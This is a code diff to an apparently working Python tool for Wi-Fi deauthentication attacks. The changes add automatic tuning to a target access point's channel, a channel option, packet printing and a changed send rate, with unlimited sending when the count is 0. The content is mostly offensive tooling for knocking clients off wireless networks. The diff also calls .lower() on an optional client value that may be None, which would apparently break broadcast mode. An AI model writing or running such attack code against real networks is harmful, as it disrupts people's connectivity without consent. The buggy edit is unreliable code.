@@ -14,7 +14,14 @@ SCRIPT_DIR = Path(__file__).resolve().parent
 if str(SCRIPT_DIR) not in sys.path:
     sys.path.insert(0, str(SCRIPT_DIR))
 
-from helpers import add_interface_argument, check_interface, check_mac, check_monitor
+from helpers import (
+    add_interface_argument,
+    check_interface,
+    check_mac,
+    check_monitor,
+    set_right_channel,
+    run_command,
+)
 
 if "_ARGCOMPLETE" not in os.environ:
     from colorama import Fore
@@ -87,8 +94,7 @@ def _excute_attack_packets(interface, packets, count):
             sent_count += nbr_packets
             if (sent_count % 10) == 0 or sent_count == count:
                 print(f"\rPackets sent: {sent_count}", end="", flush=True)
-            if loop_forever:
-                time.sleep(0.01)
+            time.sleep(0.6)
 
     except KeyboardInterrupt:
         print("\nAttack stopped by user.")
@@ -113,6 +119,11 @@ def _deauth_attack(interface, bssid, count, client=None):
             f"{Fore.RED}Interface is not in monitor mode (current mode: {_}).\nUse hitmon to enable monitor mode."
         )
         sys.exit(1)
+
+    # To make sure the interface is on the same bssid channel
+    print(f"{Fore.GREEN}Checking for the right channel...{Fore.GREEN}")
+    set_right_channel(interface, bssid)
+
     # Create packets based on attack type
     if client is not None:
         print(
@@ -124,6 +135,9 @@ def _deauth_attack(interface, bssid, count, client=None):
             f"{Fore.GREEN}Starting broadcast deauthentication attack on AP {bssid}...{Fore.RESET}"
         )
         packets = _create_broadcast_attack_packets(bssid)
+
+    for p in packets:
+        print(p.summary())
 
     _excute_attack_packets(interface, packets, count)
 
@@ -150,9 +164,8 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     subparser = parser.add_subparsers(
-        dest="attack", metavar="attack-mode", help="Attack mode"
+        dest="attack", metavar="attack-mode", help="Attack mode", required=True
     )
-    subparser.required = True
     attack_names = [name for name, _, _ in ATTACK_DEFINITIONS]
     subparser.completer = ChoicesCompleter(attack_names)
 
@@ -170,18 +183,27 @@ def main():
                 "-b",
                 "--bssid",
                 help="MAC address of the Access Point.",
-            )
+            ).completer = ChoicesCompleter([])
+
             attack_parser.add_argument(
                 "-c",
                 "--client",
                 required=False,
                 help="MAC address of the client.",
-            )
+            ).completer = ChoicesCompleter([])
+
+            attack_parser.add_argument(
+                "-C",
+                "--channel",
+                required=False,
+                help="Channel of the Access Point. (Not required but recommended)",
+            ).completer = ChoicesCompleter(map(str, range(1, 15)))
+
             attack_parser.add_argument(
                 "count",
                 type=int,
                 help="Number of deauthentication packets to send (0 for unlimited).",
-            )
+            ).completer = ChoicesCompleter([])
 
     argcomplete.autocomplete(parser)
 
@@ -208,10 +230,10 @@ def main():
 
     if bssid:
         check_mac(bssid)
-        print(f"{Fore.YELLOW}| Target BSSID:{Fore.RESET} {args.bssid}")
+        print(f"{Fore.YELLOW}| Target BSSID:{Fore.RESET} {args.bssid.lower()}")
     if client:
         check_mac(client)
-        print(f"{Fore.YELLOW}| Target Client:{Fore.RESET} {args.client}")
+        print(f"{Fore.YELLOW}| Target Client:{Fore.RESET} {args.client.lower()}")
 
     if args.attack == "deauth":
         if args.count == 0:
@@ -230,7 +252,7 @@ def main():
                 f"{Fore.YELLOW}No client (station) mac address given. Initiating broadcast deauthentication...{Fore.RESET}"
             )
 
-        _deauth_attack(args.interface, bssid, args.count, client)
+        _deauth_attack(args.interface, bssid.lower(), args.count, client.lower())
 
     else:
         print(f"{Fore.RED}Attack '{args.attack}' is not implemented yet.{Fore.RESET}")
